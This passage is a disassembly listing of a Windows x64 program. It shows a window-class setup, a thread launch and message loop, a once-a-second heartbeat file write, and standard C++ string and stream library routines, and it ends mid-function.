xor     ecx, ecx        ; lpModuleName
call    cs:GetModuleHandleW
mov     rsi, rax
mov     qword ptr [rsp+730h+var_6D0.cbSize], 50h ; 'P'
mov     qword ptr [rsp+730h+var_6D0.cbClsExtra], r14
xorps   xmm0, xmm0
movdqa  xmmword ptr [rbp+630h+var_6D0.hIcon], xmm0
xorps   xmm1, xmm1
movdqa  xmmword ptr [rbp+630h+var_6D0.hbrBackground], xmm1
movdqa  xmmword ptr [rbp+630h+var_6D0.lpszClassName], xmm0
lea     rax, sub_140004880
mov     [rsp+730h+var_6D0.lpfnWndProc], rax
mov     [rsp+730h+var_6D0.hInstance], rsi
mov     edx, 7F00h      ; lpCursorName
xor     ecx, ecx        ; hInstance
call    cs:LoadCursorW
mov     [rbp+630h+var_6D0.hCursor], rax
mov     [rbp+630h+var_6D0.hbrBackground], 6
lea     rax, ClassName  ; "YYWnd_7f3a9c1e"
mov     [rbp+630h+var_6D0.lpszClassName], rax
lea     rcx, [rsp+730h+var_6D0] ; WNDCLASSEXW *
call    cs:RegisterClassExW
test    ax, ax
jnz     short loc_140004D07
xor     eax, eax
mov     rcx, [rbp+630h+var_30]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 710h
pop     r14
pop     rdi
pop     rsi
pop     rbx
pop     rbp
retn

loc_140004CF4:
inc     r8w
cmp     r8w, bx
jb      loc_140004AF1
jmp     loc_140004B33

loc_140004D07:          ; hInstance
mov     rcx, rsi
call    sub_140004780
xorps   xmm0, xmm0
movups  [rsp+730h+var_6F0], xmm0
mov     [rsp+730h+var_6E0], r14
mov     [rsp+730h+var_6D8], r14
mov     ecx, 40h ; '@'  ; Size
call    sub_1400062C0
mov     qword ptr [rsp+730h+var_6F0], rax
mov     [rsp+730h+var_6E0], 37h ; '7'
mov     [rsp+730h+var_6D8], 3Fh ; '?'
movups  xmm0, cs:xmmword_1400091B0
movups  xmmword ptr [rax], xmm0
movups  xmm1, cs:xmmword_1400091C0
movups  xmmword ptr [rax+10h], xmm1
movups  xmm0, cs:xmmword_1400091D0
movups  xmmword ptr [rax+20h], xmm0
movsd   xmm1, qword ptr cs:xmmword_1400091D0+0Fh
movsd   qword ptr [rax+2Fh], xmm1
mov     [rax+37h], r14b
lea     rcx, [rsp+730h+var_6F0]
call    sub_140001780
nop
mov     rdx, [rsp+730h+var_6D8]
cmp     rdx, 0Fh
jbe     short loc_140004DBB
inc     rdx
mov     rcx, qword ptr [rsp+730h+var_6F0]
cmp     rdx, 1000h
jb      short loc_140004DB6
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      loc_140004E5A
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140004DB6:
call    j_j_free

loc_140004DBB:          ; lpThreadId
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140002D30 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
mov     rdi, rax
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14 ; lpThreadId
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_1400034A0 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
mov     rbx, rax
test    rdi, rdi
jz      short loc_140004E0B
mov     rcx, rdi        ; hObject
call    cs:CloseHandle

loc_140004E0B:
test    rbx, rbx
jz      short loc_140004E19
mov     rcx, rbx        ; hObject
call    cs:CloseHandle

loc_140004E19:
mov     edi, r14d
nop     dword ptr [rax+00h]

loc_140004E20:          ; wRemoveMsg
mov     [rsp+730h+dwCreationDisposition], 1
xor     r9d, r9d        ; wMsgFilterMax
xor     r8d, r8d        ; wMsgFilterMin
xor     edx, edx        ; hWnd
lea     rcx, [rbp+630h+Msg] ; lpMsg
call    cs:PeekMessageW
test    eax, eax
jz      short loc_140004E61
cmp     [rbp+630h+Msg.message], 12h
jz      short loc_140004E20
lea     rcx, [rbp+630h+Msg] ; lpMsg
call    cs:TranslateMessage
lea     rcx, [rbp+630h+Msg] ; lpMsg
call    cs:DispatchMessageW
jmp     short loc_140004E20

loc_140004E5A:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140004E61:          ; hWnd
mov     rcx, cs:qword_14000C550
test    rcx, rcx
jz      short loc_140004E77
call    cs:IsWindow
test    eax, eax
jnz     short loc_140004E7F

loc_140004E77:          ; hInstance
mov     rcx, rsi
call    sub_140004780

loc_140004E7F:
call    cs:GetTickCount
mov     ebx, eax
mov     [rbp+630h+Buffer], eax
mov     ecx, eax
sub     ecx, edi
cmp     ecx, 3E8h
jb      loc_140004F44
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+630h+Filename] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      loc_140004F42
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+630h+Filename] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140004ECD
mov     [rax+2], r14w

loc_140004ECD:
lea     r8, aYyHbTmp    ; "yy_hb.tmp"
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+630h+Filename] ; Destination
call    cs:wcscat_s
mov     [rsp+730h+hTemplateFile], r14 ; hTemplateFile
mov     [rsp+730h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
mov     [rsp+730h+dwCreationDisposition], 2 ; dwCreationDisposition
xor     r9d, r9d        ; lpSecurityAttributes
mov     edx, 40000000h  ; dwDesiredAccess
mov     r8d, 3          ; dwShareMode
lea     rcx, [rbp+630h+Filename] ; lpFileName
call    cs:CreateFileW
mov     rdi, rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      short loc_140004F42
mov     [rbp+630h+NumberOfBytesWritten], r14d
mov     qword ptr [rsp+730h+dwCreationDisposition], r14 ; lpOverlapped
lea     r9, [rbp+630h+NumberOfBytesWritten] ; lpNumberOfBytesWritten
mov     r8d, 4          ; nNumberOfBytesToWrite
lea     rdx, [rbp+630h+Buffer] ; lpBuffer
mov     rcx, rax        ; hFile
call    cs:WriteFile
mov     rcx, rdi        ; hObject
call    cs:CloseHandle

loc_140004F42:
mov     edi, ebx

loc_140004F44:          ; dwMilliseconds
mov     ecx, 14h
call    cs:Sleep
jmp     loc_140004E20
; } // starts at 1400048B0
sub_1400048B0 endp

algn_140004F54:
align 20h



; __int64 __fastcall sub_140004F60(void *)
sub_140004F60 proc near

var_40= qword ptr -40h
var_24= byte ptr -24h
var_23= byte ptr -23h
var_20= qword ptr -20h
arg_8= qword ptr  10h
arg_10= qword ptr  18h

; __unwind { // __GSHandlerCheck
push    rbx
push    rdi
push    r14
sub     rsp, 50h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+68h+var_20], rax
xor     r14d, r14d
mov     [rsp+68h+var_40], rcx
mov     r8d, edx
mov     rbx, rcx
test    edx, edx
jns     short loc_140005001
neg     r8d
cmp     r8d, 0Ah
jnb     short loc_140004FAC
add     r8b, 30h ; '0'
lea     rdi, [rsp+68h+var_24]
dec     rdi
mov     [rsp+68h+var_24], r8b
mov     byte ptr [rdi], 2Dh ; '-'
jmp     loc_140005069

loc_140004FAC:
lea     rdi, [rsp+68h+var_23]
lea     rcx, a00010203040506 ; "000102030405060708091011121314151617181"...
nop     dword ptr [rax+rax+00000000h]

loc_140004FC0:
mov     eax, 51EB851Fh
mov     r9, rdi
mul     r8d
sub     rdi, 2
shr     edx, 5
imul    eax, edx, 64h ; 'd'
sub     r8d, eax
mov     eax, r8d
mov     r8d, edx
movzx   eax, word ptr [rcx+rax*2]
mov     [rdi], ax
cmp     edx, 0Ah
jnb     short loc_140004FC0
test    edx, edx
jz      short loc_140004FF9
lea     rdi, [r9-3]
add     r8b, 30h ; '0'
mov     [rdi], r8b

loc_140004FF9:
dec     rdi
mov     byte ptr [rdi], 2Dh ; '-'
jmp     short loc_140005069

loc_140005001:
cmp     r8d, 0Ah
jnb     short loc_140005017
add     r8b, 30h ; '0'
lea     rdi, [rsp+68h+var_24]
mov     [rsp+68h+var_24], r8b
jmp     short loc_140005069

loc_140005017:
lea     rdi, [rsp+68h+var_23]
lea     rcx, a00010203040506 ; "000102030405060708091011121314151617181"...
nop     dword ptr [rax+00h]
nop     word ptr [rax+rax+00000000h]

loc_140005030:
mov     eax, 51EB851Fh
mov     r9, rdi
mul     r8d
sub     rdi, 2
shr     edx, 5
imul    eax, edx, 64h ; 'd'
sub     r8d, eax
mov     eax, r8d
mov     r8d, edx
movzx   eax, word ptr [rcx+rax*2]
mov     [rdi], ax
cmp     edx, 0Ah
jnb     short loc_140005030
test    edx, edx
jz      short loc_140005069
lea     rdi, [r9-3]
add     r8b, 30h ; '0'
mov     [rdi], r8b

loc_140005069:
xorps   xmm0, xmm0
; } // starts at 140004F60

loc_14000506C:
; __unwind { // __GSHandlerCheck
mov     [rsp+68h+arg_8], rbp
movups  xmmword ptr [rbx], xmm0
lea     rax, [rsp+68h+var_23]
mov     [rbx+10h], r14
mov     [rbx+18h], r14
mov     [rsp+68h+arg_10], rsi
cmp     rdi, rax
jnz     short loc_14000509E
mov     qword ptr [rbx+18h], 0Fh
mov     [rbx], r14b
jmp     loc_14000516F

loc_14000509E:
lea     rsi, [rsp+68h+var_23]
mov     rbp, 7FFFFFFFFFFFFFFFh
sub     rsi, rdi
cmp     rsi, rbp
ja      loc_140005195
cmp     rsi, 0Fh
ja      short loc_1400050E2
mov     r8, rsi         ; Size
mov     [rbx+10h], rsi
mov     rdx, rdi        ; Src
mov     qword ptr [rbx+18h], 0Fh
mov     rcx, rbx        ; void *
call    memcpy
mov     [rbx+rsi], r14b
jmp     loc_14000516F

loc_1400050E2:
mov     rax, rsi
or      rax, 0Fh
cmp     rax, rbp
jbe     short loc_14000510D
mov     rcx, 8000000000000000h
add     rcx, 27h ; '''  ; Size

loc_1400050FC:
call    sub_1400062C0
test    rax, rax
jnz     short loc_140005138
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_14000510D:
mov     ecx, 16h
mov     rbp, rax
cmp     rax, rcx
cmovb   rbp, rcx
lea     rax, [rbp+1]
test    rax, rax
jz      short loc_140005151
cmp     rax, 1000h
jb      short loc_140005146
lea     rcx, [rax+27h]
cmp     rcx, rax
jbe     short loc_14000519B
jmp     short loc_1400050FC

loc_140005138:
lea     r14, [rax+27h]
and     r14, 0FFFFFFFFFFFFFFE0h
mov     [r14-8], rax
jmp     short loc_140005151

loc_140005146:          ; Size
mov     rcx, rax
call    sub_1400062C0
mov     r14, rax

loc_140005151:          ; Size
mov     r8, rsi
mov     [rbx], r14
mov     rdx, rdi        ; Src
mov     [rbx+10h], rsi
mov     rcx, r14        ; void *
mov     [rbx+18h], rbp
call    memcpy
mov     byte ptr [r14+rsi], 0

loc_14000516F:
mov     rsi, [rsp+68h+arg_10]
mov     rax, rbx
mov     rbp, [rsp+68h+arg_8]
mov     rcx, [rsp+68h+var_20]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 50h
pop     r14
pop     rdi
pop     rbx
retn

loc_140005195:
call    sub_140001210
db 0CCh

loc_14000519B:
call    sub_140001170
db 0CCh
; } // starts at 14000506C
sub_140004F60 endp

algn_1400051A1:
align 10h



sub_1400051B0 proc near

var_38= qword ptr -38h
var_30= byte ptr -30h
arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= dword ptr  18h

; FUNCTION CHUNK AT 0000000140006E96 SIZE 00000006 BYTES
; FUNCTION CHUNK AT 0000000140007358 SIZE 0000003B BYTES

; __unwind { // __CxxFrameHandler4
mov     [rsp+arg_8], rbx
mov     [rsp+arg_0], rcx
push    rsi
push    rdi
push    r12
push    r14
push    r15
sub     rsp, 30h
mov     r12, rdx
mov     rdi, rcx
xor     ebx, ebx
mov     [rsp+58h+arg_10], ebx
mov     rcx, rdx        ; Str
call    strlen
mov     r15, rax
mov     r8, [rdi]
movsxd  rcx, dword ptr [r8+4]
mov     rsi, [rcx+rdi+28h]
test    rsi, rsi
jle     short loc_1400051F8
cmp     rsi, rax
jle     short loc_1400051F8
sub     rsi, rax
jmp     short loc_1400051FA

loc_1400051F8:
xor     esi, esi

loc_1400051FA:
mov     r14, rdi
mov     [rsp+58h+var_38], rdi
mov     rcx, [rcx+rdi+48h]
test    rcx, rcx
jz      short loc_140005213
mov     rax, [rcx]
call    qword ptr [rax+8]
nop

loc_140005213:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdi
call    cs:?good@ios_base@std@@QEBA_NXZ ; std::ios_base::good(void)
test    al, al
jnz     short loc_14000522D
mov     [rsp+58h+var_30], al
jmp     short loc_140005266

loc_14000522D:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
mov     rcx, [rcx+rdi+50h]
test    rcx, rcx
jz      short loc_14000525F
cmp     rcx, rdi
jz      short loc_14000525F
call    cs:?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ ; std::ostream::flush(void)
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdi
call    cs:?good@ios_base@std@@QEBA_NXZ ; std::ios_base::good(void)
mov     [rsp+58h+var_30], al
jmp     short loc_140005266

loc_14000525F:
mov     [rsp+58h+var_30], 1
mov     al, 1

loc_140005266:
test    al, al
jnz     short loc_140005274
mov     ebx, 4
jmp     loc_14000531F

loc_140005274:
mov     rdx, [rdi]
movsxd  rax, dword ptr [rdx+4]
mov     ecx, [rax+rdi+18h]
and     ecx, 1C0h
cmp     ecx, 40h ; '@'
jz      short loc_1400052B6
nop     word ptr [rax+rax+00h]

loc_140005290:
mov     rdx, [rdi]
test    rsi, rsi
jle     short loc_1400052B6
movsxd  rcx, dword ptr [rdx+4]
movzx   edx, byte ptr [rcx+rdi+58h]
mov     rcx, [rcx+rdi+48h]
;   try {
call    cs:?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::streambuf::sputc(char)
cmp     eax, 0FFFFFFFFh
jz      short loc_1400052F6
dec     rsi
jmp     short loc_140005290

loc_1400052B6:
movsxd  rcx, dword ptr [rdx+4]
mov     r8, r15
mov     rdx, r12
mov     rcx, [rcx+rdi+48h]
call    cs:?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z ; std::streambuf::sputn(char const *,__int64)
cmp     rax, r15
jnz     short loc_1400052F6

loc_1400052D0:
test    rsi, rsi
jle     short loc_1400052FF
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
movzx   edx, byte ptr [rcx+rdi+58h]
mov     rcx, [rcx+rdi+48h]
call    cs:?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::streambuf::sputc(char)
cmp     eax, 0FFFFFFFFh
jz      short loc_1400052F6
dec     rsi
jmp     short loc_1400052D0

loc_1400052F6:
mov     ebx, 4
mov     [rsp+58h+arg_10], ebx

loc_1400052FF:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
mov     qword ptr [rcx+rdi+28h], 0
;   } // starts at 1400052A6
jmp     short loc_14000531F
mov     rdi, [rsp+58h+arg_0]
mov     ebx, [rsp+58h+arg_10]
mov     r14, [rsp+58h+var_38]

loc_14000531F:
mov     rax, [rdi]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdi
xor     r8d, r8d
mov     edx, ebx
call    cs:?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::ios::setstate(int,bool)
nop
call    cs:?uncaught_exceptions@std@@YAHXZ ; std::uncaught_exceptions(void)
test    eax, eax
jnz     short loc_140005349
mov     rcx, r14
call    cs:?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ ; std::ostream::_Osfx(void)
nop

loc_140005349:
mov     rax, [r14]
movsxd  rcx, dword ptr [rax+4]
mov     rcx, [rcx+r14+48h]
test    rcx, rcx
jz      short loc_140005361
mov     rax, [rcx]
call    qword ptr [rax+10h]
nop

loc_140005361:
mov     rax, rdi
mov     rbx, [rsp+58h+arg_8]
add     rsp, 30h
pop     r15
pop     r14
pop     r12
pop     rdi
pop     rsi
retn
; } // starts at 1400051B0
sub_1400051B0 endp

algn_140005376:
align 20h



; __int64 __fastcall sub_140005380(wchar_t *Buffer, wchar_t *Format)
sub_140005380 proc near

Locale= qword ptr -28h
ArgList= qword ptr -20h
arg_8= qword ptr  10h
arg_10= byte ptr  18h
arg_18= qword ptr  20h

mov     [rsp+arg_8], rdx
mov     qword ptr [rsp+arg_10], r8
mov     [rsp+arg_18], r9
push    rbx
push    rsi
push    rdi
sub     rsp, 30h
mov     rdi, rdx
lea     rsi, [rsp+48h+arg_10]
mov     rbx, rcx
call    sub_140001000
mov     [rsp+48h+ArgList], rsi ; ArgList
mov     r9, rdi         ; Format
mov     r8d, 400h       ; BufferCount
mov     [rsp+48h+Locale], 0 ; Locale
mov     rdx, rbx        ; Buffer
mov     rcx, [rax]      ; Options
call    cs:__stdio_common_vswprintf_s
test    eax, eax
mov     ecx, 0FFFFFFFFh
cmovs   eax, ecx
add     rsp, 30h
pop     rdi
pop     rsi
pop     rbx
retn
sub_140005380 endp

algn_1400053DB:
align 20h



sub_1400053E0 proc near
push    rbx
sub     rsp, 20h
mov     rbx, rcx
mov     rcx, [rcx+18h]
cmp     rcx, 0Fh
jbe     short loc_14000542C
mov     rax, [rbx]
lea     rdx, [rcx+1]
cmp     rdx, 1000h
jb      short loc_140005421
mov     r8, [rax-8]
sub     rax, r8
sub     rax, 8
cmp     rax, 1Fh
ja      short loc_14000541A
lea     rdx, [rcx+28h]
jmp     short loc_140005424

loc_14000541A:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140005421:
mov     r8, rax

loc_140005424:          ; Block
mov     rcx, r8
call    j_j_free

loc_14000542C:
mov     qword ptr [rbx+10h], 0
mov     qword ptr [rbx+18h], 0Fh
mov     byte ptr [rbx], 0
add     rsp, 20h
pop     rbx
retn
sub_1400053E0 endp

algn_140005445:
align 10h



sub_140005450 proc near

arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h
arg_18= qword ptr  20h

push    rsi
mov     esi, r9d
mov     r10, rdx
mov     r11, rcx
and     esi, 1
jz      short loc_14000546A
test    byte ptr [rcx+70h], 4
jz      short loc_14000546A
mov     al, 1
jmp     short loc_14000546C

loc_14000546A:
xor     al, al

loc_14000546C:
and     r9d, 2
jz      short loc_14000547C
test    byte ptr [rcx+70h], 2
jz      short loc_14000547C
mov     cl, 1
jmp     short loc_14000547E

loc_14000547C:
xor     cl, cl

loc_14000547E:
or      al, cl
mov     [rsp+8+arg_0], rbx
mov     [rsp+8+arg_10], r14
mov     [rsp+8+arg_18], r15
jnz     loc_140005549
mov     rbx, [r8+8]
add     rbx, [r8]
test    byte ptr [r11+70h], 2
mov     r15, [r11+38h]
mov     r8, [r15]
jz      short loc_1400054AE
xor     ecx, ecx
jmp     short loc_1400054C4

loc_1400054AE:
mov     rax, [r11+40h]
mov     rcx, [rax]
test    rcx, rcx
jz      short loc_1400054C4
cmp     [r11+68h], rcx
jnb     short loc_1400054C4
mov     [r11+68h], rcx

loc_1400054C4:
mov     rax, [r11+18h]
mov     rdx, [r11+68h]
mov     r14, [rax]
mov     rax, rdx
sub     rax, r14
cmp     rbx, rax
ja      short loc_140005549
test    rbx, rbx
jz      short loc_1400054F2
test    esi, esi
jz      short loc_1400054E8
test    r8, r8
jz      short loc_140005549

loc_1400054E8:
test    r9d, r9d
jz      short loc_1400054F2
test    rcx, rcx
jz      short loc_140005549

loc_1400054F2:
mov     [rsp+8+arg_8], rdi
lea     rdi, [r14+rbx]
test    esi, esi
jz      short loc_14000550F
test    r8, r8
jz      short loc_14000550F
mov     [r15], rdi
sub     edx, edi
mov     rax, [r11+50h]
mov     [rax], edx

loc_14000550F:
test    r9d, r9d
jz      short loc_14000553F
test    rcx, rcx
jz      short loc_14000553F
mov     rax, [r11+58h]
movsxd  r8, dword ptr [rax]
mov     rax, [r11+40h]
add     r8, [rax]
mov     rax, [r11+20h]
sub     r8d, edi
mov     [rax], r14
mov     rax, [r11+40h]
mov     [rax], rdi
mov     rax, [r11+58h]
mov     [rax], r8d

loc_14000553F:
mov     rdi, [rsp+8+arg_8]
mov     [r10], rbx
jmp     short loc_140005550

loc_140005549:
mov     qword ptr [r10], 0FFFFFFFFFFFFFFFFh

loc_140005550:
mov     r15, [rsp+8+arg_18]
xor     eax, eax
mov     r14, [rsp+8+arg_10]
mov     rbx, [rsp+8+arg_0]
mov     qword ptr [r10+8], 0
mov     [r10+10h], rax
mov     rax, r10
pop     rsi
retn
sub_140005450 endp

algn_140005572:
align 20h



sub_140005580 proc near

arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h
arg_18= qword ptr  20h
arg_20= dword ptr  28h

push    rbp
push    rdi
push    r12
mov     edi, [rsp+18h+arg_20]
mov     r12, r8
mov     ebp, edi
mov     r10, rdx
mov     r11, rcx
and     ebp, 1
jz      short loc_1400055A3
test    byte ptr [rcx+70h], 4
jz      short loc_1400055A3
mov     al, 1
jmp     short loc_1400055A5

loc_1400055A3:
xor     al, al

loc_1400055A5:
mov     r8d, edi
and     r8d, 2
jz      short loc_1400055B8
test    byte ptr [rcx+70h], 2
jz      short loc_1400055B8
mov     cl, 1
jmp     short loc_1400055BA

loc_1400055B8:
xor     cl, cl

loc_1400055BA:
or      al, cl
mov     [rsp+18h+arg_0], rbx
mov     [rsp+18h+arg_8], rsi
mov     [rsp+18h+arg_10], r14
mov     [rsp+18h+arg_18], r15
jnz     loc_1400056E8
test    byte ptr [r11+70h], 2
mov     rax, [r11+38h]
mov     rsi, [rax]
jz      short loc_1400055E8
xor     ecx, ecx
jmp     short loc_1400055FE

loc_1400055E8:
mov     rax, [r11+40h]
mov     rcx, [rax]
test    rcx, rcx
jz      short loc_1400055FE
cmp     [r11+68h], rcx
jnb     short loc_1400055FE
mov     [r11+68h], rcx

loc_1400055FE:
mov     r15, [r11+18h]
mov     r14, [r11+68h]
mov     rdx, r14
mov     rbx, [r15]
sub     rdx, rbx
test    r9d, r9d
jz      short loc_14000566F
sub     r9d, 1
jz      short loc_140005629
cmp     r9d, 1
jnz     loc_1400056E8
mov     rax, rdx
jmp     short loc_140005671

loc_140005629:
and     edi, 3
cmp     dil, 3
jz      loc_1400056E8
test    ebp, ebp
jz      short loc_140005650
test    rsi, rsi
jnz     short loc_140005648
test    rbx, rbx
jnz     loc_1400056E8

loc_140005648:
mov     rax, rsi
sub     rax, rbx
jmp     short loc_140005671

loc_140005650:
test    r8d, r8d
jz      loc_1400056E8
test    rcx, rcx
jnz     short loc_140005667
test    rbx, rbx
jnz     loc_1400056E8

loc_140005667:
mov     rax, rcx
sub     rax, rbx
jmp     short loc_140005671

loc_14000566F:
xor     eax, eax

loc_140005671:
lea     r9, [rax+r12]
cmp     r9, rdx
ja      short loc_1400056E8
test    r9, r9
jz      short loc_140005692
test    ebp, ebp
jz      short loc_140005688
test    rsi, rsi
jz      short loc_1400056E8

loc_140005688:
test    r8d, r8d
jz      short loc_140005692
test    rcx, rcx
jz      short loc_1400056E8

loc_140005692:
lea     rdi, [r9+rbx]
test    ebp, ebp
jz      short loc_1400056B3
test    rsi, rsi
jz      short loc_1400056B3
mov     [r15], rbx
sub     r14d, edi
mov     rax, [r11+38h]
mov     [rax], rdi
mov     rax, [r11+50h]
mov     [rax], r14d

loc_1400056B3:
test    r8d, r8d
jz      short loc_1400056E3
test    rcx, rcx
jz      short loc_1400056E3
mov     rax, [r11+58h]
movsxd  r8, dword ptr [rax]
mov     rax, [r11+40h]
add     r8, [rax]
mov     rax, [r11+20h]
sub     r8d, edi
mov     [rax], rbx
mov     rax, [r11+40h]
mov     [rax], rdi
mov     rax, [r11+58h]
mov     [rax], r8d

loc_1400056E3:
mov     [r10], r9
jmp     short loc_1400056EF

loc_1400056E8:
mov     qword ptr [r10], 0FFFFFFFFFFFFFFFFh

loc_1400056EF:
mov     r15, [rsp+18h+arg_18]
xor     eax, eax
mov     r14, [rsp+18h+arg_10]
mov     rsi, [rsp+18h+arg_8]
mov     rbx, [rsp+18h+arg_0]
mov     qword ptr [r10+8], 0
mov     [r10+10h], rax
mov     rax, r10
pop     r12
pop     rdi
pop     rbp
retn
sub_140005580 endp

algn_140005719:
align 20h



sub_140005720 proc near
mov     r10, [rcx+38h]
mov     rdx, [r10]
test    rdx, rdx
jz      short loc_140005776
mov     r9, [rcx+50h]
movsxd  rax, dword ptr [r9]
add     rax, rdx
cmp     rdx, rax
jnb     short loc_14000573F
movzx   eax, byte ptr [rdx]
retn

loc_14000573F:
mov     rax, [rcx+40h]
mov     r8, [rax]
test    r8, r8
jz      short loc_140005776
test    byte ptr [rcx+70h], 4
jnz     short loc_140005776
mov     rax, [rcx+68h]
cmp     rax, r8
cmovb   rax, r8
cmp     rax, rdx
jbe     short loc_140005776
mov     [rcx+68h], rax
sub     eax, [r10]
mov     [r9], eax
mov     rax, [rcx+38h]
mov     rcx, [rax]
movzx   eax, byte ptr [rcx]
retn

loc_140005776:
mov     eax, 0FFFFFFFFh
retn
sub_140005720 endp

align 20h



sub_140005780 proc near
mov     rax, [rcx+38h]
mov     r8, [rax]
test    r8, r8
jz      short loc_1400057CC
mov     rax, [rcx+18h]
cmp     r8, [rax]
jbe     short loc_1400057CC
cmp     edx, 0FFFFFFFFh
jz      short loc_1400057A6
cmp     dl, [r8-1]
jz      short loc_1400057A6
test    byte ptr [rcx+70h], 2
jnz     short loc_1400057CC

loc_1400057A6:
mov     rax, [rcx+50h]
inc     dword ptr [rax]
mov     rax, [rcx+38h]
dec     qword ptr [rax]
cmp     edx, 0FFFFFFFFh
jz      short loc_1400057C1
mov     rax, [rcx+38h]
mov     rcx, [rax]
mov     [rcx], dl

loc_1400057C1:
xor     eax, eax
cmp     edx, 0FFFFFFFFh
cmovz   edx, eax
mov     eax, edx
retn

loc_1400057CC:
mov     eax, 0FFFFFFFFh
retn
sub_140005780 endp

align 20h



sub_1400057E0 proc near

arg_8= qword ptr  10h
arg_10= qword ptr  18h

mov     [rsp+arg_8], rbx
mov     [rsp+arg_10], rbp
push    rsi
push    rdi
push    r12
push    r14
push    r15
sub     rsp, 20h
test    byte ptr [rcx+70h], 2
mov     r12d, edx
mov     rbx, rcx
jnz     loc_1400059BA
cmp     edx, 0FFFFFFFFh
jnz     short loc_140005812
xor     eax, eax
jmp     loc_1400059BF

loc_140005812:
mov     rax, [rcx+40h]
mov     r8, [rax]
test    r8, r8
jz      loc_1400058CA
mov     rcx, [rcx+58h]
movsxd  rdx, dword ptr [rcx]
lea     rdi, [r8+rdx]
cmp     r8, rdi
jnb     short loc_140005858
lea     eax, [rdx-1]
mov     [rcx], eax
mov     rcx, [rbx+40h]
mov     rdx, [rcx]
lea     rax, [rdx+1]
mov     [rcx], rax
lea     rax, [r8+1]
mov     [rdx], r12b
mov     [rbx+68h], rax
mov     eax, r12d
jmp     loc_1400059BF

loc_140005858:
mov     rax, [rbx+18h]
lea     r14, [rbx+18h]
mov     rsi, [rax]
sub     rdi, rsi
cmp     rdi, 20h ; ' '
jb      short loc_1400058D7
cmp     rdi, 3FFFFFFFh
jnb     short loc_14000589B
lea     rbp, [rdi+rdi]
test    rbp, rbp
jnz     short loc_140005883
xor     r15d, r15d
jmp     short loc_1400058E7

loc_140005883:
cmp     rbp, 1000h
jb      short loc_1400058DC
lea     rcx, [rbp+27h]
cmp     rcx, rbp
jbe     loc_1400059D6
jmp     short loc_1400058AE

loc_14000589B:
mov     ebp, 7FFFFFFFh
cmp     rdi, rbp
jnb     loc_1400059BA
mov     ecx, 80000026h  ; Size

loc_1400058AE:
call    sub_1400062C0
test    rax, rax
jz      loc_140005988
lea     r15, [rax+27h]
and     r15, 0FFFFFFFFFFFFFFE0h
mov     [r15-8], rax
jmp     short loc_1400058E7

loc_1400058CA:
mov     rax, [rcx+18h]
lea     r14, [rcx+18h]
xor     edi, edi
mov     rsi, [rax]

loc_1400058D7:
mov     ebp, 20h ; ' '

loc_1400058DC:          ; Size
mov     rcx, rbp
call    sub_1400062C0
mov     r15, rax

loc_1400058E7:          ; Size
mov     r8, rdi
mov     rdx, rsi        ; Src
mov     rcx, r15        ; void *
call    memcpy
lea     rdx, [r15+rdi]
lea     rcx, [rdx+1]
mov     [rbx+68h], rcx
mov     rcx, [rbx+20h]
mov     [rcx], r15
mov     rcx, [rbx+40h]
mov     [rcx], rdx
lea     rcx, [r15+rbp]
mov     rax, [rbx+58h]
sub     ecx, edx
mov     [rax], ecx
test    byte ptr [rbx+70h], 4
jz      short loc_14000593A
mov     rax, [r14]
mov     [rax], r15
mov     rax, [rbx+38h]
mov     [rax], r15
mov     rax, [rbx+50h]
mov     dword ptr [rax], 0
jmp     short loc_140005962

loc_14000593A:
mov     rax, [rbx+38h]
mov     r8, [rbx+68h]
mov     rdx, [rax]
mov     rax, [r14]
sub     rdx, rsi
add     rdx, r15
sub     r8d, edx
mov     [rax], r15
mov     rax, [rbx+38h]
mov     [rax], rdx
mov     rax, [rbx+50h]
mov     [rax], r8d

loc_140005962:
test    byte ptr [rbx+70h], 1
jz      short loc_14000599A
cmp     rdi, 1000h
jb      short loc_14000598F
mov     rcx, [rsi-8]
sub     rsi, rcx
sub     rsi, 8
cmp     rsi, 1Fh
ja      short loc_140005988
add     rdi, 27h ; '''
